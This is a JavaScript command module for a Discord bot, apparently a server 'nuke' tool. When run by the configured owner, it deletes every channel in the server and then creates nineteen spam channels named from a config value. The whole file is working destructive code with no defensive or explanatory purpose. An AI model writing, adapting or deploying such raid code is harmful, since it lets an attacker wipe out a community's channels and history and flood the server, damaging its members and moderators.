  
  
const Discord = require("discord.js");
const config = require("../config.json")

module.exports = {
  name: "run2",
  
  async run (client, message, args) {
    let ping = "@everyone"
    
    if(message.author.id !== config.owner) return;
    message.guild.channels.cache.forEach((channel)=>{
      channel.delete()
    })
    message.guild.channels.create(config.omg);
    message.guild.channels.create(config.omg);
    message.guild.channels.create(config.omg);
    message.guild.channels.create(config.omg);
    message.guild.channels.create(config.omg);
    message.guild.channels.create(config.omg);
    message.guild.channels.create(config.omg);
    message.guild.channels.create(config.omg);
    message.guild.channels.create(config.omg);
    message.guild.channels.create(config.omg);
    message.guild.channels.create(config.omg);
    message.guild.channels.create(config.omg);
    message.guild.channels.create(config.omg);
    message.guild.channels.create(config.omg);
    message.guild.channels.create(config.omg);
    message.guild.channels.create(config.omg);
    message.guild.channels.create(config.omg);
    message.guild.channels.create(config.omg);
    message.guild.channels.create(config.omg);
  }
}
